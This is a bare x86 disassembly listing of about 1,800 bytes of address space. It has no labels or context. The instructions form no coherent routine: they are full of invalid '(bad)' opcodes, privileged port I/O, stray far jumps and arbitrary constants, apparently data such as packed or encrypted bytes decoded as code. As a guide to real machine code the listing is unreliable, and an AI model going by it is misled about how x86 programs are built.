  412d76:	mov    ecx,DWORD PTR [eax+ecx*2-0x1c891a8e]
  412d7d:	inc    eax
  412d7e:	loope  0x412d24
  412d80:	mov    esp,0x8d6d49fc
  412d85:	sub    DWORD PTR [edx+eax*8-0x5722789a],esi
  412d8c:	ret    
  412d8d:	push   esi
  412d8e:	fld    QWORD PTR [ecx]
  412d90:	push   0xc4e550cf
  412d95:	xchg   ecx,eax
  412d96:	inc    edx
  412d97:	push   edi
  412d98:	(bad)  
  412d99:	xor    BYTE PTR [ebp-0x1f91fa80],dl
  412d9f:	pop    edx
  412da0:	out    dx,al
  412da1:	pusha  
  412da2:	push   eax
  412da3:	mov    ds:0xd8eae1e4,al
  412da8:	lock dec esi
  412daa:	pusha  
  412dab:	(bad)  
  412dac:	adc    bh,dl
  412dae:	lock dec ecx
  412db0:	xor    al,0x80
  412db2:	(bad)  
  412db3:	lahf   
  412db4:	inc    ecx
  412db5:	out    dx,al
  412db6:	mov    eax,0x7ebdf87c
  412dbb:	sar    DWORD PTR [ebx+0x755a5ab1],0x94
  412dc2:	mov    ds:0x2fe949b8,eax
  412dc7:	test   eax,0xe0ba23f
  412dcc:	cmp    eax,0x2f707e68
  412dd1:	xlat   BYTE PTR ds:[ebx]
  412dd2:	popa   
  412dd3:	push   0x112a593d
  412dd8:	mov    fs,edi
  412dda:	loop   0x412d6c
  412ddc:	out    0x32,al
  412dde:	iret   
  412ddf:	pop    ebp
  412de0:	sub    eax,0xd67288c1
  412de5:	das    
  412de6:	dec    esp
  412de7:	repnz fidiv DWORD PTR [ebx+0x16]
  412deb:	hlt    
  412dec:	xchg   ebx,eax
  412ded:	push   0x3c
  412def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412df1:	ror    DWORD PTR [esi*8-0x12eaf9bf],0xe7
  412df9:	inc    eax
  412dfa:	mov    esi,0xef7c9d59
  412dff:	mov    al,0x64
  412e01:	shr    DWORD PTR [edx+0xc0cf9e0],1
  412e07:	pop    eax
  412e08:	pop    ds
  412e09:	push   eax
  412e0a:	fucomip st,st(4)
  412e0c:	in     al,0xc
  412e0e:	and    BYTE PTR [edx-0x5e],dh
  412e11:	jle    0x412dbd
  412e13:	fistp  DWORD PTR [esi-0x259e9998]
  412e19:	add    dh,bl
  412e1b:	jge    0x412dee
  412e1d:	pushf  
  412e1e:	jb     0x412e1d
  412e20:	in     al,dx
  412e21:	cmp    DWORD PTR gs:[edi+ecx*1],ebx
  412e25:	shl    DWORD PTR [eax+0x45],cl
  412e28:	pop    edi
  412e29:	sbb    DWORD PTR [edi-0x49],0xffffff82
  412e2d:	std    
  412e2e:	pop    ds
  412e2f:	push   edx
  412e30:	push   0xffffffe7
  412e32:	jge    0x412ea9
  412e34:	cwde   
  412e35:	inc    eax
  412e36:	mov    WORD PTR [esi-0x79],ss
  412e39:	xor    BYTE PTR [ecx],al
  412e3b:	stc    
  412e3c:	push   ecx
  412e3d:	or     eax,0xca48c334
  412e42:	fimul  DWORD PTR [ebp+0x18]
  412e45:	ficom  WORD PTR [ebx+0x297f09e5]
  412e4b:	xchg   esp,eax
  412e4c:	pop    esp
  412e4d:	push   ss
  412e4e:	cli    
  412e4f:	test   esi,edi
  412e51:	jge    0x412ea4
  412e53:	add    eax,0x2f6c3a7f
  412e58:	push   ebp
  412e59:	fld    TBYTE PTR ds:0xb059d354
  412e5f:	dec    ecx
  412e60:	adc    DWORD PTR [ebx+0x604171a0],ebp
  412e66:	pop    edx
  412e67:	and    al,0x43
  412e69:	test   eax,0x2a82d11c
  412e6e:	push   cs
  412e6f:	rcr    BYTE PTR [edi+ebx*2],0xb8
  412e73:	ror    DWORD PTR [edi],0x61
  412e76:	pop    esi
  412e77:	repz (bad) 
  412e79:	dec    esp
  412e7a:	loope  0x412e63
  412e7c:	mov    bh,0x18
  412e7e:	dec    eax
  412e7f:	push   edx
  412e80:	mov    dl,0xa1
  412e82:	(bad)  
  412e83:	daa    
  412e84:	stc    
  412e85:	jecxz  0x412ea2
  412e87:	jmp    0xaa2f:0xc787ccd0
  412e8e:	retf   
  412e8f:	mov    dl,0x73
  412e91:	push   ecx
  412e92:	xchg   esi,eax
  412e93:	outs   dx,BYTE PTR ds:[esi]
  412e94:	sbb    esi,DWORD PTR [ebx-0x75]
  412e97:	(bad)  
  412e98:	mov    ecx,0x12c41104
  412e9d:	ficomp DWORD PTR [ecx+0x5557160c]
  412ea3:	mov    ah,0xfa
  412ea5:	mov    ebx,0xebe2ce6a
  412eaa:	aas    
  412eab:	fidivr WORD PTR [ebp+0x55]
  412eae:	push   ebp
  412eaf:	push   0xf8c7e3f1
  412eb4:	lods   al,BYTE PTR ds:[esi]
  412eb5:	test   eax,0xb1d2394c
  412eba:	xor    al,0x88
  412ebc:	jl     0x412efd
  412ebe:	push   esp
  412ebf:	cmp    DWORD PTR [esi+0x28],edx
  412ec2:	(bad)  
  412ec3:	fsubp  st(0),st
  412ec5:	out    0xf2,eax
  412ec7:	out    dx,eax
  412ec8:	adc    BYTE PTR [ecx+0x690522f0],dl
  412ece:	add    ch,BYTE PTR [ebp+0x46]
  412ed1:	jmp    0x412e68
  412ed3:	(bad)  
  412ed4:	ss in  eax,dx
  412ed6:	mov    WORD PTR [eax+edx*4-0x8ebaa60],ss
  412edd:	ds xchg ebx,eax
  412edf:	xchg   ebp,eax
  412ee0:	jp     0x412e6f
  412ee2:	or     al,0x28
  412ee4:	adc    eax,0xc82cc523
  412ee9:	fmul   st,st(1)
  412eeb:	imul   DWORD PTR [edi+esi*4+0x7100b755]
  412ef2:	inc    esi
  412ef3:	pop    edi
  412ef4:	arpl   WORD PTR [bp+di+0x1b],bx
  412ef8:	fwait
  412ef9:	jecxz  0x412e9d
  412efb:	pushf  
  412efc:	jmp    0x8979:0xcf759222
  412f03:	ja     0x412ebd
  412f05:	pop    edx
  412f06:	inc    ebp
  412f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f08:	fadd   QWORD PTR [edi+0x73]
  412f0b:	inc    edx
  412f0c:	mul    DWORD PTR [ebp+0x6]
  412f0f:	mov    ah,ch
  412f11:	aam    0x1
  412f13:	jle    0x412eea
  412f15:	or     BYTE PTR [ecx-0x493b959c],cl
  412f1b:	int    0x5f
  412f1d:	test   BYTE PTR ds:0x37638ef4,bl
  412f23:	xchg   edi,eax
  412f24:	push   esp
  412f25:	aam    0x96
  412f27:	aam    0xd2
  412f29:	and    dl,BYTE PTR [ecx+esi*8+0xb]
  412f2d:	or     al,0x24
  412f30:	inc    esi
  412f31:	mov    ch,0xc3
  412f33:	stc    
  412f34:	ret    
  412f35:	mov    edx,0xa2937033
  412f3a:	aad    0x34
  412f3c:	jmp    0x412eea
  412f3e:	adc    bh,BYTE PTR [ecx+0x7395af11]
  412f44:	mov    edx,fs
  412f46:	enter  0xae39,0x6a
  412f4a:	test   al,0xad
  412f4d:	setp   dl
  412f50:	repz (bad) 
  412f52:	adc    eax,0xc42267b9
  412f57:	jle    0x412f32
  412f59:	iret   
  412f5a:	rol    DWORD PTR [esi],0x17
  412f5d:	inc    edi
  412f5e:	outs   dx,BYTE PTR ds:[esi]
  412f5f:	hlt    
  412f60:	js     0x412f7a
  412f62:	cli    
  412f63:	sbb    al,0x71
  412f65:	pop    ss
  412f66:	add    edi,DWORD PTR [edi+0x7d9d7b83]
  412f6c:	mov    dl,0x3d
  412f6e:	jo     0x412fb7
  412f70:	cmp    BYTE PTR [ebx+ecx*4-0x5d0aa243],dl
  412f77:	cld    
  412f78:	adc    cl,cl
  412f7a:	jne    0x412faa
  412f7c:	pop    ecx
  412f7d:	cli    
  412f7e:	add    ecx,eax
  412f80:	sbb    eax,0xa29799e2
  412f85:	ret    
  412f86:	cs (bad) 
  412f88:	sub    eax,0xb07a3ef2
  412f8d:	mov    edx,0x11356830
  412f92:	xchg   edx,eax
  412f93:	mov    bh,0xcc
  412f95:	and    al,0xb8
  412f97:	test   eax,0x1026cc3b
  412f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f9d:	out    dx,eax
  412f9e:	mov    ebp,gs
  412fa0:	jge    0x412f6e
  412fa2:	push   ss
  412fa3:	push   ebx
  412fa4:	pop    es
  412fa5:	sbb    eax,0x4701305b
  412faa:	mov    ebx,0x1288cc0e
  412faf:	jl     0x412f4a
  412fb1:	push   ecx
  412fb2:	sbb    eax,0x46bc1d12
  412fb7:	lahf   
  412fb8:	sub    DWORD PTR [edx+ebp*2-0x60],esi
  412fbc:	or     al,0x4b
  412fbe:	ja     0x412fca
  412fc0:	icebp  
  412fc1:	cmp    eax,0x607b40b7
  412fc6:	fstp   DWORD PTR [edx-0x62]
  412fc9:	sbb    dl,BYTE PTR [edx]
  412fcb:	arpl   si,cx
  412fcd:	push   esp
  412fce:	adc    eax,0x569ccd53
  412fd3:	into   
  412fd4:	push   ebx
  412fd5:	mov    ch,0xad
  412fd7:	inc    edx
  412fd8:	fwait
  412fd9:	add    BYTE PTR ds:[ebx-0x429ce6fc],cl
  412fe0:	xchg   esi,eax
  412fe1:	cmp    BYTE PTR [ecx+ebp*8],cl
  412fe4:	sub    al,0x3
  412fe6:	pop    esi
  412fe7:	inc    eax
  412fe8:	or     eax,0x45fbaef7
  412fed:	cs pop ecx
  412fef:	fisttp DWORD PTR ds:0xfcfd5a49
  412ff5:	mov    bh,0x2d
  412ff7:	repnz xchg edx,eax
  412ff9:	xchg   ebx,eax
  412ffa:	retf   
  412ffb:	add    BYTE PTR [ebp+0x7a],bh
  412ffe:	xchg   esp,eax
  412fff:	xchg   ebp,eax
  413000:	sbb    DWORD PTR [esi],eax
  413002:	xlat   BYTE PTR ds:[ebx]
  413003:	pop    esi
  413004:	add    al,0xac
  413006:	(bad)  
  413008:	or     eax,0xeaaa2581
  41300d:	inc    ebp
  41300e:	in     eax,0x21
  413010:	jne    0x412fcb
  413012:	or     BYTE PTR [esi],bl
  413014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413015:	mov    ah,0xe6
  413017:	push   0x1f
  413019:	add    eax,0xa6d2de0d
  41301e:	or     eax,0x661ea410
  413023:	fild   QWORD PTR [ebx+0x1cdbe8fe]
  413029:	outs   dx,DWORD PTR ds:[esi]
  41302a:	push   ecx
  41302b:	mov    edx,0x7a55b8be
  413030:	lods   eax,DWORD PTR ds:[esi]
  413031:	push   0xffffffaf
  413033:	clc    
  413034:	loopne 0x41307a
  413036:	xor    al,0xf0
  413038:	or     eax,0xc4f2e88a
  41303d:	sahf   
  41303e:	xor    eax,0x2565f0f7
  413043:	aaa    
  413044:	push   0x2c
  413046:	sbb    DWORD PTR [edi-0x44dc9ce7],edi
  41304c:	scas   eax,DWORD PTR es:[edi]
  41304d:	aam    0xfc
  41304f:	icebp  
  413050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413051:	aaa    
  413052:	ss mov ah,0xf
  413055:	cmp    BYTE PTR ds:0xa1c46af0,bl
  41305b:	push   esi
  41305c:	scas   eax,DWORD PTR es:[edi]
  41305d:	jecxz  0x413081
  41305f:	mov    DWORD PTR [esi-0x6],esp
  413062:	fcomp  QWORD PTR [esi+0x6b5ea1b1]
  413068:	mov    DWORD PTR [ebx],0x730dd1bf
  41306e:	and    ecx,eax
  413070:	xor    eax,DWORD PTR [ebx+0x257d3da3]
  413076:	fs mov esi,0x8d4b1555
  41307c:	test   DWORD PTR [ecx],ebx
  41307e:	es sbb edx,eax
  413081:	inc    ebp
  413082:	pop    ds
  413083:	hlt    
  413084:	retf   0x1f5
  413087:	cmp    al,0x59
  413089:	and    esp,DWORD PTR [edi+0x13]
  41308c:	jmp    0x857b:0x1387aa44
  413093:	out    dx,al
  413094:	ficom  DWORD PTR [ebp-0x48]
  413097:	(bad)  
  413098:	mov    ?,WORD PTR [eax-0x34]
  41309b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41309c:	jle    0x413085
  41309e:	mov    edx,edi
  4130a0:	push   cs
  4130a1:	jmp    0x9a9e:0xcf73b741
  4130a8:	(bad)  
  4130a9:	mov    al,ds:0x14302055
  4130ae:	ror    DWORD PTR [ecx-0x10],0xac
  4130b2:	rol    BYTE PTR [esi],0x8c
  4130b5:	arpl   WORD PTR [eax+0x7e],ax
  4130b8:	and    al,0xbb
  4130ba:	push   ebp
  4130bb:	cmp    eax,0x24d401d4
  4130c0:	inc    ebp
  4130c1:	and    DWORD PTR [esi],esp
  4130c3:	sbb    DWORD PTR [eax],ebp
  4130c5:	shl    DWORD PTR [edi],1
  4130c7:	pop    ss
  4130c8:	or     bl,BYTE PTR [edi-0x421e7faa]
  4130ce:	add    al,0xc7
  4130d0:	sub    al,0x9
  4130d2:	stc    
  4130d3:	in     al,0x71
  4130d5:	xor    esi,DWORD PTR [edx]
  4130d7:	rcr    edx,cl
  4130d9:	adc    cl,dl
  4130db:	mov    ds:0x8a5505e,eax
  4130e0:	mov    al,ds:0xe0c19e28
  4130e5:	mov    bh,0x60
  4130e7:	lds    ebx,FWORD PTR [edi+eiz*1]
  4130ea:	add    DWORD PTR [esi-0x58],esi
  4130ed:	inc    ebp
  4130ee:	and    eax,0xebd7f847
  4130f3:	pop    ecx
  4130f4:	add    bl,BYTE PTR [ebx-0x3697edf1]
  4130fa:	sbb    eax,0xcdd27ef
  4130ff:	and    esp,DWORD PTR [esi-0x43d458aa]
  413105:	sahf   
  413106:	cld    
  413107:	pushf  
  413108:	xor    DWORD PTR [eax+0x24],0x49
  41310c:	xor    eax,0xc9258ce0
  413111:	jp     0x4130c0
  413113:	mov    bh,0xa6
  413115:	inc    esp
  413116:	xchg   DWORD PTR gs:[edx-0x72],esp
  41311a:	out    0x61,eax
  41311c:	nop
  41311d:	pop    es
  41311e:	lahf   
  41311f:	xchg   edi,eax
  413120:	addr16 mov edi,0xb985f85a
  413126:	mov    ebp,DWORD PTR [edx]
  413128:	mov    ds,WORD PTR [ebx]
  41312a:	mov    DWORD PTR [ecx],eax
  41312c:	stos   BYTE PTR es:[edi],al
  41312d:	outs   dx,BYTE PTR ds:[esi]
  41312e:	aaa    
  41312f:	pop    ecx
  413130:	jns    0x413158
  413132:	push   ebx
  413133:	je     0x41318b
  413135:	pop    esi
  413136:	out    dx,eax
  413137:	cmp    dl,BYTE PTR [esi]
  413139:	imul   edx,DWORD PTR ds:0x6ddd82d3,0x12
  413140:	fnstcw WORD PTR [esi-0x7f]
  413143:	mov    bl,0xe6
  413145:	test   ebp,esp
  413147:	mov    edi,0xb337e05b
  41314c:	sbb    ch,al
  41314e:	add    BYTE PTR [ebp-0x48],ah
  413151:	push   esi
  413152:	sbb    eax,DWORD PTR [ebx]
  413154:	jge    0x413164
  413156:	cmp    eax,esp
  413158:	iret   
  413159:	jecxz  0x4130e4
  41315b:	stos   DWORD PTR es:[edi],eax
  41315c:	stos   DWORD PTR es:[edi],eax
  41315d:	dec    eax
  41315e:	scas   eax,DWORD PTR es:[edi]
  41315f:	ins    DWORD PTR es:[edi],dx
  413160:	arpl   WORD PTR [ebp+0x15],bx
  413163:	pop    es
  413164:	sbb    DWORD PTR [esi],esp
  413166:	outs   dx,BYTE PTR ds:[esi]
  413167:	sbb    BYTE PTR [edx+0x39],ah
  41316a:	popa   
  41316b:	inc    edi
  41316c:	and    esp,DWORD PTR [eax]
  41316e:	(bad)  
  41316f:	fwait
  413170:	adc    DWORD PTR [edi],eax
  413172:	fmul   QWORD PTR [ecx]
  413174:	pusha  
  413175:	push   ds
  413176:	pop    ds
  413177:	mov    bl,0x78
  413179:	mov    WORD PTR [ebx+edi*4-0x5b700a2],gs
  413180:	lea    edi,[edi+0x55aea763]
  413186:	jmp    0x41318f
  413188:	cmc    
  413189:	mov    edx,0xe2d3605f
  41318e:	out    dx,al
  41318f:	mov    esp,0x990ba59b
  413194:	jo     0x4131b9
  413196:	test   al,0x55
  413198:	or     esi,DWORD PTR [edi]
  41319a:	ficom  DWORD PTR [esi]
  41319c:	in     al,dx
  41319d:	rol    esi,1
  41319f:	in     al,dx
  4131a0:	sub    bh,dh
  4131a2:	adc    BYTE PTR [edi-0x71ee00c5],dl
  4131a8:	(bad)  
  4131a9:	(bad)  
  4131aa:	push   edx
  4131ab:	mov    ecx,0x8d5195f4
  4131b0:	int    0x94
  4131b2:	mov    ch,0xd4
  4131b4:	add    eax,edx
  4131b6:	xchg   edx,eax
  4131b7:	or     DWORD PTR [edi],edx
  4131b9:	mov    ebp,0x46b9fbfc
  4131be:	dec    ebx
  4131bf:	daa    
  4131c0:	xchg   ebx,eax
  4131c1:	retf   0xae76
  4131c4:	add    ecx,DWORD PTR [edi-0x6a]
  4131c7:	xchg   edx,eax
  4131c8:	(bad)  
  4131c9:	aad    0xff
  4131cb:	loop   0x41324c
  4131cd:	or     eax,0xf4c6e56f
  4131d2:	inc    esp
  4131d3:	ins    DWORD PTR es:[edi],dx
  4131d4:	sar    cl,cl
  4131d6:	push   es
  4131d7:	outs   dx,BYTE PTR ds:[esi]
  4131d8:	retf   
  4131d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131db:	fwait
  4131dc:	adc    edx,DWORD PTR [ebp+0x2a]
  4131df:	test   DWORD PTR [edi+ebx*4-0x3ba3430d],edi
  4131e6:	mov    ah,0xf4
  4131e8:	fimul  DWORD PTR [ebx-0x4e80639]
  4131ee:	dec    ecx
  4131ef:	aad    0x6
  4131f1:	sbb    BYTE PTR [edx-0xf],ah
  4131f4:	inc    ecx
  4131f5:	xchg   esi,eax
  4131f6:	jg     0x41320f
  4131f8:	sar    esi,cl
  4131fa:	rol    ebx,cl
  4131fc:	push   0x41954a61
  413201:	jb     0x41318c
  413203:	cmp    al,BYTE PTR [esi]
  413205:	inc    ecx
  413206:	jp     0x4131e1
  413208:	sar    BYTE PTR [esi+0x98b952f],cl
  41320e:	rol    ah,1
  413210:	outs   dx,DWORD PTR ds:[esi]
  413211:	bound  edx,QWORD PTR [ebx-0x71]
  413214:	dec    edx
  413215:	mov    edi,0xdd4d553c
  41321a:	xchg   ebp,eax
  41321b:	fldenv [ebp+0x58]
  41321e:	mov    edi,edi
  413220:	scas   eax,DWORD PTR es:[edi]
  413221:	(bad)
  413224:	mov    bh,0xc7
  413226:	add    DWORD PTR [esi+0xe4440eb],ebx
  41322c:	mov    eax,ds:0x7de92c2e
  413231:	xor    BYTE PTR [esi],dl
  413233:	rol    DWORD PTR [ecx+0x3abd9483],cl
  413239:	popf   
  41323a:	sbb    esi,DWORD PTR [ebp+0xa]
  41323d:	mov    BYTE PTR [eax],dl
  41323f:	pop    ds
  413240:	mov    eax,ds:0xa0ab214a
  413245:	btr    DWORD PTR [ebx],esp
  413248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413249:	mov    edi,0xdb58701f
  41324e:	dec    ecx
  41324f:	push   cs
  413250:	stos   DWORD PTR es:[edi],eax
  413251:	inc    esi
  413252:	cmp    BYTE PTR [ebp+0x19056be9],bl
  413258:	dec    eax
  413259:	xor    ebx,DWORD PTR fs:[esi+0x6e]
  41325d:	repz mov bl,0xe3
  413260:	adc    BYTE PTR [ebx+0x3db06342],0x35
  413267:	mov    al,ds:0x40667a0a
  41326c:	jns    0x41326e
  41326e:	fbstp  TBYTE PTR [ecx-0x43]
  413271:	sub    BYTE PTR ds:[ecx+edx*2-0x16c47d54],dh
  413279:	xchg   edi,eax
  41327a:	dec    edx
  41327b:	pop    ebx
  41327c:	fstp   QWORD PTR [ecx-0x69]
  41327f:	pop    es
  413280:	pusha  
  413281:	mov    dl,0xa7
  413283:	dec    eax
  413284:	sub    dl,bh
  413286:	retf   0x932d
  413289:	(bad)  
  41328a:	pusha  
  41328b:	push   0x776fc45b
  413290:	xchg   ebp,eax
  413291:	xchg   ecx,eax
  413292:	inc    ecx
  413293:	sub    DWORD PTR [esi+0x196d2c42],eax
  413299:	xchg   esp,eax
  41329a:	xchg   ebp,eax
  41329b:	mov    al,0x34
  41329d:	jmp    0x945a:0x96e2781b
  4132a4:	lock sbb eax,0xa7497be7
  4132aa:	adc    ah,BYTE PTR [eax+0x0]
  4132ad:	pop    es
  4132ae:	int3   
  4132af:	pop    ebp
  4132b0:	mov    ch,BYTE PTR [edi+0x42]
  4132b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132b4:	dec    edx
  4132b5:	test   DWORD PTR [edi],edi
  4132b7:	lock dec ecx
  4132b9:	fs lahf 
  4132bb:	fwait
  4132bc:	out    dx,al
  4132bd:	push   DWORD PTR [edi+0x17]
  4132c0:	push   0x9780aabf
  4132c5:	ror    dl,1
  4132c7:	pusha  
  4132c8:	or     bl,bh
  4132ca:	lods   eax,DWORD PTR ds:[esi]
  4132cb:	push   edi
  4132cc:	jle    0x41329f
  4132ce:	loopne 0x413333
  4132d0:	push   edi
  4132d1:	js     0x4132b3
  4132d3:	(bad)  
  4132d4:	and    DWORD PTR [esi],ecx
  4132d6:	mov    al,ds:0x3c43db14
  4132db:	fild   WORD PTR [edi]
  4132dd:	bound  ebx,QWORD PTR [edi]
  4132df:	jmp    0x413351
  4132e1:	add    DWORD PTR [ecx],ebx
  4132e3:	sub    al,ch
  4132e5:	scas   eax,DWORD PTR es:[edi]
  4132e6:	cdq    
  4132e7:	pop    edi
  4132e8:	fidiv  DWORD PTR [ecx]
  4132ea:	cmp    al,0x72
  4132ec:	out    dx,al
  4132ed:	outs   dx,DWORD PTR ds:[esi]
  4132ee:	jp     0x41331b
  4132f0:	nop
  4132f1:	jecxz  0x41335f
  4132f3:	mov    bh,0x74
  4132f5:	lea    esp,[eax]
  4132f7:	pop    ds
  4132f8:	and    edx,DWORD PTR [edx+ebp*8+0x74]
  4132fc:	fnstsw WORD PTR [ebp-0x31344ee4]
  413302:	(bad)  
  413303:	mov    dl,0xe7
  413305:	in     al,dx
  413306:	mov    ebp,0x811378fe
  41330b:	sbb    esp,ebx
  41330d:	test   DWORD PTR [ebx-0x70],ecx
  413310:	loopne 0x4132b4
  413312:	inc    edi
  413313:	loope  0x4132f8
  413315:	gs adc al,0x3d
  413318:	inc    ebx
  413319:	jl     0x4132b6
  41331b:	mov    esi,0x29776219
  413320:	stc    
  413321:	sub    ah,BYTE PTR ds:[ebp-0x3ddae2b7]
  413328:	jmp    0xc843e0ef
  41332d:	pushf  
  41332e:	repnz rol BYTE PTR [ebp+esi*8-0xed9a4f0],0xb9
  413337:	retf   0x3660
  41333a:	pop    eax
  41333b:	leave  
  41333c:	out    0x16,eax
  41333e:	mov    eax,0xa238d4bd
  413343:	enter  0x5992,0xcb
  413347:	in     al,dx
  413348:	mov    ebx,ebx
  41334a:	lahf   
  41334b:	and    ch,BYTE PTR [edx-0x6797aef1]
  413351:	adc    eax,0x72d7e6cc
  413356:	jmp    0x4133ca
  413358:	ja     0x4132ff
  41335a:	outs   dx,BYTE PTR ds:[esi]
  41335b:	jmp    0xd456:0x817813e6
  413362:	out    0xbd,al
  413364:	jne    0x41332c
  413366:	hlt    
  413367:	inc    eax
  413368:	(bad)  
  413369:	xor    DWORD PTR [edx-0x22],ecx
  41336c:	test   al,0x11
  41336e:	fs mov esp,0x6ba39850
  413374:	lods   al,BYTE PTR ds:[esi]
  413375:	and    BYTE PTR [edx+0x75a58212],cl
  41337b:	sub    al,ch
  41337d:	add    ebx,DWORD PTR [ecx]
  41337f:	dec    edi
  413380:	(bad)  [ecx-0x1d862bc9]
  413386:	adc    eax,0xdb884e4a
  41338b:	mov    bl,0xfb
  41338d:	jnp    0x413396
  41338f:	stos   DWORD PTR es:[edi],eax
  413390:	shl    DWORD PTR [esi-0x53],cl
  413393:	jecxz  0x413375
  413395:	push   cs
  413396:	pop    ebp
  413397:	push   eax
  413398:	cmp    DWORD PTR [eax-0x521436b7],edi
  41339e:	aam    0xd2
  4133a0:	mov    dh,0x4f
  4133a2:	mov    bh,0x15
  4133a4:	test   eax,0x75fb90fa
  4133a9:	pop    edx
  4133aa:	dec    esi
  4133ab:	mov    edi,0x5a906275
  4133b0:	fwait
  4133b1:	push   esp
  4133b2:	or     al,0x97
  4133b4:	call   0x449c9155
  4133b9:	adc    ebp,DWORD PTR [ecx]
  4133bb:	hlt    
  4133bc:	push   cs
  4133bd:	xlat   BYTE PTR ds:[ebx]
  4133be:	dec    ebp
  4133bf:	(bad)  
  4133c0:	pop    es
  4133c1:	fadd   QWORD PTR ss:[eax-0x32c3fae9]
  4133c8:	inc    ebp
  4133c9:	xchg   ebp,eax
  4133ca:	ss in  eax,0x80
  4133cd:	mov    esp,DWORD PTR [edi]
  4133cf:	push   ecx
  4133d0:	iret   
  4133d1:	mov    cl,0xd5
  4133d3:	dec    ebp
  4133d4:	test   edi,esp
  4133d6:	sbb    eax,0x8bf625cb
  4133db:	xchg   BYTE PTR ds:0x9a0c380a,bl
  4133e1:	sbb    BYTE PTR [ebx-0x44],cl
  4133e4:	(bad)  
  4133e5:	fld    QWORD PTR [ebx]
  4133e7:	xchg   BYTE PTR [ecx+0x303493bf],cl
  4133ed:	push   edx
  4133ee:	xchg   DWORD PTR [eax],ecx
  4133f0:	(bad)  
  4133f1:	aam    0x70
  4133f3:	sbb    BYTE PTR [edi+0x37],dl
  4133f6:	imul   esp,DWORD PTR [ebx+0x25],0xf177dd3d
  4133fd:	ins    DWORD PTR es:[edi],dx
  4133fe:	retf   
  4133ff:	test   eax,0x85d54b3b
  413404:	or     DWORD PTR [ebp+0x4c],ebx
  413407:	pusha  
  413408:	push   ebx
  413409:	scas   al,BYTE PTR es:[edi]
  41340a:	push   esp
  41340b:	mov    esp,0xcd363ebd
  413410:	xor    eax,0xdbf8277b
  413415:	dec    ecx
  413416:	jp     0x413448
  413418:	retf   0x3ef1
  41341b:	or     edi,edx
  41341d:	test   DWORD PTR [ebp+0x15],esp
  413420:	(bad)  
  413421:	or     DWORD PTR [esi],esi
  413423:	pop    ebp
  413424:	inc    ebx
  413425:	cmp    cl,BYTE PTR [ebp+0x71]
  413428:	dec    ecx
  413429:	push   esp
  41342a:	pop    esp
  41342b:	idiv   ch
  41342d:	(bad)  
  41342e:	iret   
  41342f:	adc    al,BYTE PTR [edi]
  413431:	inc    edx
  413432:	mov    ds:0x74bf3850,al
  413437:	inc    esi
  413438:	fadd   DWORD PTR [ebp-0x38b605bc]
  41343e:	xlat   BYTE PTR ds:[ebx]
  41343f:	cs ret 
  413441:	or     al,BYTE PTR [edx-0x22]
  413444:	mov    WORD PTR [edx+0x661d5e4b],fs
  41344a:	aaa    
  41344b:	sbb    BYTE PTR [ecx+0x549fc811],dh
  413451:	cli    
  413452:	sahf   
  413453:	push   ds
  413454:	test   al,0x40
  413456:	push   ecx
  413457:	(bad)
  41345b:	mov    bl,0x76
  41345d:	jle    0x413472
  41345f:	inc    ebx
  413460:	loope  0x413453
  413462:	xchg   edx,eax
  413463:	clc    
  413464:	add    eax,0xfd3dea27
  413469:	lods   eax,DWORD PTR ds:[esi]
  41346a:	sar    eax,1
  41346c:	mov    edi,0x199d504f
  413471:	mov    WORD PTR [edi-0x1b],ds
  413474:	icebp  
  413475:	in     al,dx
  413476:	cmp    edx,esi
  413478:	lea    ebp,[ecx-0x4]
  41347b:	inc    edx
  41347c:	sub    ebp,DWORD PTR ds:0xeb2aaef1
  413482:	ins    BYTE PTR es:[edi],dx
  413483:	push   es
  413484:	iret   
  413485:	dec    esi
  413486:	cmp    eax,eax
  413488:	mov    bh,0xc6
  41348a:	inc    ebx
  41348b:	fnsave [ecx-0x66]
  41348e:	and    BYTE PTR [ecx-0x5c],cl
  413491:	push   esi
  413492:	addr16 pop esi
  413494:	push   ds
  413495:	jp     0x4134a8
  413497:	inc    ebx
  413498:	imul   DWORD PTR [edi+0x7ec628a1]
  41349e:	cdq    
  41349f:	test   BYTE PTR [ebp-0x3e],bl
  4134a2:	cmp    BYTE PTR [edx+0x50],bl
  4134a5:	sbb    DWORD PTR [eax],eax
  4134a7:	inc    edi
  4134a8:	ret    
  4134a9:	popa   
  4134aa:	push   ecx
  4134ab:	push   ss
  4134ac:	jb     0x4134bb
  4134ae:	out    0x9,al
  4134b0:	test   DWORD PTR [ecx+0x24],edi
  4134b3:	arpl   WORD PTR [ebx-0x3a],bp
  4134b6:	dec    edx
  4134b7:	fwait
  4134b8:	xchg   ecx,eax
  4134b9:	mov    bl,0x49
  4134bb:	inc    eax
  4134bc:	leave  
  4134bd:	push   ss
  4134be:	or     eax,0x3ae75ba7
  4134c3:	sti    
  4134c4:	jmp    0x4134d5
  4134c6:	jmp    0x4134ed
  4134c8:	cmp    al,0xda
  4134ca:	sar    BYTE PTR [eax+0x67],cl
  4134cd:	push   ecx
  4134ce:	xchg   edx,eax
  4134cf:	sbb    al,0xc2
  4134d1:	(bad)  
  4134d2:	(bad)  
  4134d3:	jmp    0x57bf874e
  4134d8:	out    dx,eax
  4134d9:	push   0x11844873
  4134de:	mov    ebx,0x52654b46
  4134e3:	and    dl,bh
  4134e5:	dec    ebp
  4134e6:	adc    ebp,DWORD PTR [ecx-0x52]
  4134e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134ea:	adc    eax,0xc10381fb
  4134ef:	mov    ecx,0x98051109
  4134f4:	cdq    
  4134f5:	pop    esi
  4134f6:	out    0x60,al
  4134f8:	add    cl,BYTE PTR [edx+0x22658ff5]
  4134fe:	and    eax,0x556bf593
  413503:	jo     0x4134da
  413505:	dec    edi
  413506:	stos   DWORD PTR es:[edi],eax
  413507:	cmc    
  413508:	test   al,0xfc
  41350a:	sbb    BYTE PTR [esi+edi*1],ch
  41350d:	cmp    ah,BYTE PTR [ebp+0x48]
